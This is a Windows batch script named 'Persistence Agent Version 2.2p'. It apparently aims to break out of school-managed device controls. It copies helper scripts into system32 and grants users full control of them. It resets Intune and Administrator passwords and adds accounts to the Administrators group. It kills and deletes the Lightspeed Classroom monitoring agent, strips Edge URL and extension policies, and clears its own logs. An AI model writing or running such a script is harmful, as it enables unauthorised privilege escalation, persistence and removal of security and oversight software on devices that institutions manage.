@ECHO OFF

echo Clearing Previous Logs
del C:\Windows\system32\Logs\Log*.txt
del C:\Windows\system32\Logs\flowdLogs.txt

echo Persistence Agent Version 2.2p > C:\Windows\system32\Logs\Log1.txt

echo Waiting for full system startup and clearing logs... > C:\Windows\system32\Logs\Log2.txt
timeout /t 5

echo Update Script > C:\Windows\system32\Logs\Log3.txt
xcopy D:\flowd.bat C:\Windows\system32\flowd.bat /y
xcopy "D:\Programs\Tools for flowd\flowd.bat" C:\Windows\system32\flowd.bat /y
xcopy D:\pass.bat C:\Windows\system32\pass.bat /y
xcopy "D:\Programs\Tools for flowd\pass.bat" C:\Windows\system32\pass.bat /y
icacls "C:\Windows\system32\flowd.bat" /grant Users:F
icacls "C:\Windows\system32\pass.bat" /grant Users:F

echo User Repair > C:\Windows\system32\Logs\Log4.txt
net user "INTUNEadmin" password
net user "IntuneAdmin" password
net localgroup Administrators test /add
net user Administrator /active:yes
net user Administrator password
net user void /active:yes
net user void password
net user DefaultAccount /active:yes
net localgroup Administrators DefaultAccount /add
net user compassAuth password

echo Process Repair and Cleanup > C:\Windows\system32\Logs\Log5.txt
taskkill /f /im CW_Svc_Service.exe
taskkill /f /im ClassroomWindows.exe
rd /s /q "C:\Program Files\Lightspeed Systems\Classroom Agent"
rd /s /q "C:\ProgramData\Lightspeed Systems\Classroom Agent"

echo Edge Patching - Powered by Contour > C:\Windows\system32\Logs\Log6.txt
taskkill /f /im msedge.exe
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge\AllowTrackingForUrls" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallBlocklist" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallAllowlist" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge\URLAllowlist" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge\URLBlocklist" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge" /v "InPrivateModeAvailability" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge" /v "BrowserSignin" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge" /v "ClearBrowsingDataOnExit" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge" /v "DeveloperToolsAvailability" /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Edge" /v "DeveloperToolsAvailability" /t REG_DWORD /d 1 /f

echo Additional Account Patching - Powered by TestPass
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Policies\System" /v "HideFastUserSwitching" /t REG_DWORD /d 0 /f

echo Logging Information...
copy C:\Windows\system32\Logs\Log*.txt C:\Windows\system32\Logs\flowdLogs.txt
del C:\Windows\system32\Logs\Log*.txt